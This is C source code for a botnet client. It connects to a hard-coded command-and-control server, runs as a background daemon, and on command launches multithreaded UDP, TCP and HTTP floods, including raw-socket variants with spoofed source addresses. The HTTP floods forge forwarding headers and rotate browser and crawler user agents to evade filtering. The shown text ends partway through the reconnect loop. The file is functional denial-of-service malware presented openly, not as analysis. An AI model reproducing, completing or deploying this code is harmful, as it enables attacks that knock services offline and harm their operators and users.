#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <fcntl.h>
#include <math.h>
#include <stdint.h>
#include <zlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <sys/utsname.h>

#define BUFFER_SIZE 4096
#define CNC_IP "45.134.39.212"
#define CNC_PORT 4087
#define MAX_PACKET 65535
#define MAX_THREADS 500
#define DEFAULT_THREADS 350
#define DEFAULT_SIZE 1400
#define DEFAULT_PPS 2000000
#define DEFAULT_DELAY 1

static int sock = -1;
static int running = 1;
static char arch[64] = "unknown";
static char version[16] = "1.0";
static int is_root = 0;

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int threads;
    int pps;
    int delay;
    int use_raw;
    char host[128];
    char path[256];
    int attack_running;
    pthread_t attack_thread;
} attack_args_t;

static attack_args_t current_attack = {0};
volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;
pthread_t *attack_threads = NULL;
attack_args_t *thread_args = NULL;
int active_threads = 0;

const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
    "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
};

#define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    if (setsid() < 0) exit(EXIT_FAILURE);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    umask(0);
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

void get_arch() {
    struct utsname uname_data;
    if (uname(&uname_data) == 0) {
        snprintf(arch, sizeof(arch), "%s_%s", uname_data.machine, uname_data.sysname);
    } else {
        strcpy(arch, "linux_x86_64");
    }
}

void check_root() {
    if (geteuid() == 0) {
        is_root = 1;
    } else {
        is_root = 0;
    }
}

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    uint32_t ip;
    do {
        ip = (rand() & 0xFF) << 24 |
             (rand() & 0xFF) << 16 |
             (rand() & 0xFF) << 8 |
             (rand() & 0xFF);
    } while (ip == 0x0100007F || ip == 0x0A000000 || ip == 0xAC100000 || ip == 0xC0A80000);
    return ip;
}

void build_http_request(char *buffer, char *host, char *path, int size, int ua_index) {
    int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
    int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
    int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
    int r13 = rand() % 255, r14 = rand() % 255, r15 = rand() % 255, r16 = rand() % 255;
    
    snprintf(buffer, size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
        "Pragma: no-cache\r\n"
        "X-Forwarded-For: %d.%d.%d.%d\r\n"
        "X-Real-IP: %d.%d.%d.%d\r\n"
        "X-Client-IP: %d.%d.%d.%d\r\n"
        "CF-Connecting-IP: %d.%d.%d.%d\r\n"
        "CF-IPCountry: US\r\n"
        "Referer: http://%s/\r\n"
        "\r\n",
        path, host, user_agents[ua_index % NUM_USER_AGENTS],
        r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, r13, r14, r15, r16,
        host
    );
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET];
    int packet_size;
    time_t end_time;
    int sent_count = 0;
    int pps_per_thread = args->pps / active_threads + 10;
    int packet_counter = 0;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return NULL;
    }

    int bufsize = 128 * 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        bufsize = 64 * 1024 * 1024;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    packet_size = args->packet_size;
    if (packet_size > 65507) packet_size = 65507;
    if (packet_size < 64) packet_size = 64;

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        int current_size = packet_size - (rand() % 200);
        if (current_size < 64) current_size = 64;
        random_payload((unsigned char *)packet, current_size);
        
        sendto(sockfd, packet, current_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        bytes_sent += current_size;
        sent_count++;
        packet_counter++;
        
        if (packet_counter >= 512) {
            sched_yield();
            packet_counter = 0;
        }
    }

    close(sockfd);
    return NULL;
}

void *tcp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET];
    int packet_size;
    time_t end_time;
    int sent_count = 0;
    int pps_per_thread = args->pps / active_threads + 10;
    int packet_counter = 0;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return NULL;
    }

    int bufsize = 128 * 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        bufsize = 64 * 1024 * 1024;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    packet_size = args->packet_size;
    if (packet_size > 65535) packet_size = 65535;
    if (packet_size < 64) packet_size = 64;

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        int conn = socket(AF_INET, SOCK_STREAM, 0);
        if (conn >= 0) {
            fcntl(conn, F_SETFL, O_NONBLOCK);
            connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
            random_payload((unsigned char *)packet, packet_size);
            send(conn, packet, packet_size, 0);
            close(conn);
            packets_sent++;
            bytes_sent += packet_size;
            sent_count++;
            packet_counter++;
        }

        if (packet_counter >= 256) {
            sched_yield();
            packet_counter = 0;
        }
    }

    close(sockfd);
    return NULL;
}

void *http_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char http_request[4096];
    int ua_counter = rand() % NUM_USER_AGENTS;
    time_t end_time;
    int sent_count = 0;
    int pps_per_thread = args->pps / active_threads + 10;
    int packet_counter = 0;
    char *paths[] = {"/", "/index.php", "/api/v1/", "/admin/", "/login/", "/wp-admin/", "/home/", "/about/", "/contact/", "/products/", "/images/", "/css/", "/js/", "/fonts/", "/download/", "/upload/", "/user/", "/profile/", "/settings/", "/dashboard/"};
    int num_paths = sizeof(paths) / sizeof(paths[0]);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return NULL;
    }

    int bufsize = 128 * 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        bufsize = 64 * 1024 * 1024;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        strcpy(args->path, paths[rand() % num_paths]);
        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        
        int conn = socket(AF_INET, SOCK_STREAM, 0);
        if (conn >= 0) {
            fcntl(conn, F_SETFL, O_NONBLOCK);
            connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
            send(conn, http_request, strlen(http_request), 0);
            close(conn);
            packets_sent++;
            bytes_sent += strlen(http_request);
            sent_count++;
            packet_counter++;
        }

        if (packet_counter >= 256) {
            sched_yield();
            packet_counter = 0;
        }
    }

    close(sockfd);
    return NULL;
}

void *udp_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;
    int sent_count = 0;
    int error_count = 0;
    int pps_per_thread = args->pps / active_threads + 10;
    int current_size;
    int packet_counter = 0;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 128 * 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        bufsize = 64 * 1024 * 1024;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    memset(packet, 0, MAX_PACKET);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        current_size = args->packet_size - (rand() % 400);
        if (current_size < 64) current_size = 64;
        packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + current_size;

        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = rand() % 256;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = rand() % 256;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + current_size);
        udp_header->check = 0;

        random_payload(payload, current_size);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        bytes_sent += packet_size;
        sent_count++;
        packet_counter++;
        
        if (packet_counter >= 512) {
            sched_yield();
            packet_counter = 0;
        }
    }

    close(sockfd);
    return NULL;
}

void *tcp_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int packet_size;
    time_t end_time;
    int sent_count = 0;
    int pps_per_thread = args->pps / active_threads + 10;
    int packet_counter = 0;
    int flags[4] = {1, 2, 4, 16};
    int flag_count = 4;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 128 * 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        bufsize = 64 * 1024 * 1024;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = rand() % 256;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = rand() % 256;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        
        int flag = flags[rand() % flag_count];
        tcp_header->syn = (flag & 1) ? 1 : 0;
        tcp_header->ack = (flag & 2) ? 1 : 0;
        tcp_header->rst = (flag & 4) ? 1 : 0;
        tcp_header->psh = (flag & 16) ? 1 : 0;
        
        tcp_header->window = htons(rand() % 65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        bytes_sent += packet_size;
        sent_count++;
        packet_counter++;
        
        if (packet_counter >= 512) {
            sched_yield();
            packet_counter = 0;
        }
    }

    close(sockfd);
    return NULL;
}

void *http_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char *payload;
    int packet_size;
    time_t end_time;
    char http_request[4096];
    int ua_counter = rand() % NUM_USER_AGENTS;
    int sent_count = 0;
    int pps_per_thread = args->pps / active_threads + 10;
    int packet_counter = 0;
    char *paths[] = {"/", "/index.php", "/api/v1/", "/admin/", "/login/", "/wp-admin/", "/home/", "/about/", "/contact/", "/products/", "/images/", "/css/", "/js/", "/fonts/", "/download/", "/upload/", "/user/", "/profile/", "/settings/", "/dashboard/", "/api/v2/", "/v1/", "/v2/", "/test/", "/dev/", "/stage/", "/prod/", "/backup/", "/temp/", "/cache/"};
    int num_paths = sizeof(paths) / sizeof(paths[0]);

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 128 * 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        bufsize = 64 * 1024 * 1024;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    memset(packet, 0, MAX_PACKET);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        strcpy(args->path, paths[rand() % num_paths]);
        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        int http_len = strlen(http_request);
        
        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
        
        if (packet_size > MAX_PACKET) {
            packet_size = MAX_PACKET;
            http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
        }
        
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
        payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = rand() % 256;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = rand() % 256;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->ack = rand() % 2;
        tcp_header->rst = rand() % 2;
        tcp_header->window = htons(rand() % 65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        memcpy(payload, http_request, http_len);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        bytes_sent += packet_size;
        sent_count++;
        packet_counter++;
        
        if (packet_counter >= 512) {
            sched_yield();
            packet_counter = 0;
        }
    }

    close(sockfd);
    return NULL;
}

void stop_attack() {
    attack_running = 0;
    
    if (attack_threads != NULL) {
        for (int i = 0; i < active_threads; i++) {
            if (attack_threads[i]) {
                pthread_join(attack_threads[i], NULL);
            }
        }
        free(attack_threads);
        attack_threads = NULL;
    }
    
    if (thread_args != NULL) {
        free(thread_args);
        thread_args = NULL;
    }
    
    active_threads = 0;
    memset(&current_attack, 0, sizeof(current_attack));
    
    if (sock > 0) {
        send(sock, "ATTACK_STOPPED\n", 15, 0);
    }
}

void start_attack(char *cmd) {
    char target[64];
    int port, duration, threads, pps, size, delay;
    char method[32];
    char host[128];
    char path[256];
    
    if (attack_running) {
        stop_attack();
        sleep(1);
    }
    
    int parsed = sscanf(cmd, ".atk %63s %d %d %31s %d %d %d %d",
                        target, &port, &duration, method, &threads, &pps, &size, &delay);
    
    if (parsed < 4) {
        if (sock > 0) {
            send(sock, "ERROR: Invalid attack format\n", 29, 0);
        }
        return;
    }
    
    if (parsed < 5) threads = DEFAULT_THREADS;
    if (parsed < 6) pps = DEFAULT_PPS;
    if (parsed < 7) size = DEFAULT_SIZE;
    if (parsed < 8) delay = DEFAULT_DELAY;
    
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (pps > 3000000) pps = 3000000;
    if (size > 65507) size = 65507;
    if (size < 64) size = 64;
    if (delay < 0) delay = 0;
    if (delay > 10000) delay = 10000;
    
    attack_running = 1;
    packets_sent = 0;
    bytes_sent = 0;
    
    strcpy(current_attack.target, target);
    current_attack.port = port;
    current_attack.duration = duration;
    current_attack.packet_size = size;
    current_attack.threads = threads;
    current_attack.pps = pps;
    current_attack.delay = delay;
    current_attack.attack_running = 1;
    
    struct hostent *he = gethostbyname(target);
    if (he != NULL) {
        struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
        strcpy(current_attack.target, inet_ntoa(*addr_list[0]));
        strcpy(host, target);
    } else {
        strcpy(host, target);
    }
    
    strcpy(current_attack.host, host);
    strcpy(current_attack.path, "/");
    
    void *(*attack_func)(void *) = NULL;
    char actual_method[64];
    
    if (is_root) {
        if (strcasecmp(method, "udp-bypass") == 0 || strcasecmp(method, "udp") == 0) {
            attack_func = udp_raw_flood;
            strcpy(actual_method, "udp-raw");
        } else if (strcasecmp(method, "tcp-bypass") == 0 || strcasecmp(method, "tcp") == 0) {
            attack_func = tcp_raw_flood;
            strcpy(actual_method, "tcp-raw");
        } else if (strcasecmp(method, "http-bypass") == 0 || strcasecmp(method, "http") == 0) {
            attack_func = http_raw_flood;
            strcpy(current_attack.path, "/");
            strcpy(actual_method, "http-raw");
        } else {
            if (sock > 0) {
                send(sock, "ERROR: Unknown method\n", 22, 0);
            }
            attack_running = 0;
            return;
        }
    } else {
        if (strcasecmp(method, "udp-bypass") == 0 || strcasecmp(method, "udp") == 0) {
            attack_func = udp_flood;
            strcpy(actual_method, "udp");
        } else if (strcasecmp(method, "tcp-bypass") == 0 || strcasecmp(method, "tcp") == 0) {
            attack_func = tcp_flood;
            strcpy(actual_method, "tcp");
        } else if (strcasecmp(method, "http-bypass") == 0 || strcasecmp(method, "http") == 0) {
            attack_func = http_flood;
            strcpy(current_attack.path, "/");
            strcpy(actual_method, "http");
        } else {
            if (sock > 0) {
                send(sock, "ERROR: Unknown method\n", 22, 0);
            }
            attack_running = 0;
            return;
        }
    }
    
    active_threads = threads;
    attack_threads = malloc(threads * sizeof(pthread_t));
    thread_args = malloc(threads * sizeof(attack_args_t));
    
    if (attack_threads == NULL || thread_args == NULL) {
        if (sock > 0) {
            send(sock, "ERROR: Memory allocation failed\n", 32, 0);
        }
        attack_running = 0;
        return;
    }
    
    for (int i = 0; i < threads; i++) {
        memcpy(&thread_args[i], &current_attack, sizeof(attack_args_t));
        thread_args[i].thread_id = i;
        thread_args[i].threads = 1;
        
        if (pthread_create(&attack_threads[i], NULL, attack_func, &thread_args[i]) != 0) {
            if (sock > 0) {
                send(sock, "ERROR: Failed to start attack thread\n", 37, 0);
            }
            attack_running = 0;
            return;
        }
        pthread_detach(attack_threads[i]);
    }
    
    if (sock > 0) {
        char response[256];
        snprintf(response, sizeof(response), "ATTACK_STARTED:%s:%d:%d:%s:%d:%d:%d:%d:root=%d\n",
                 current_attack.target, current_attack.port, current_attack.duration,
                 actual_method, threads, pps, size, delay, is_root);
        send(sock, response, strlen(response), 0);
    }
}

void execute_command(char* cmd) {
    cmd = strtok(cmd, "\r\n");
    if (!cmd) return;
    
    if (strcmp(cmd, "PING") == 0) {
        if (sock > 0) send(sock, "PONG\n", 5, 0);
    }
    else if (strncmp(cmd, ".stop", 5) == 0) {
        stop_attack();
        if (sock > 0) send(sock, "STOPPED\n", 8, 0);
    }
    else if (strncmp(cmd, ".atk", 4) == 0) {
        start_attack(cmd);
    }
}

int connect_to_cnc() {
    struct sockaddr_in server_addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(CNC_PORT);
    if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) <= 0) {
        close(sock);
        sock = -1;
        return -1;
    }
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        sock = -1;
        return -1;
    }
    
    char hbt[256];
    snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
    send(sock, hbt, strlen(hbt), 0);
    
    char info[512];
    snprintf(info, sizeof(info), "INFO:{\"arch\":\"%s\",\"version\":\"%s\",\"root\":%d}\n", arch, version, is_root);
    send(sock, info, strlen(info), 0);
    
    return 0;
}

void reconnect_loop() {
    fd_set readfds;
    struct timeval tv;
    char buffer[BUFFER_SIZE];
    
    while (running) {
        if (sock < 0) {
            connect_to_cnc();
            if (sock < 0) {
                sleep(5);
                continue;
            }
        }
        
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        tv.tv_sec = 20;
        tv.tv_usec = 0;
        
        int activity = select(sock + 1, &readfds, NULL, NULL, &tv);
        
        if (activity < 0) {
            close(sock);
            sock = -1;
            continue;
        }
        
        if (activity == 0) {
            char hbt[256];
            snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
            send(sock, hbt, strlen(hbt), 0);
            continue;
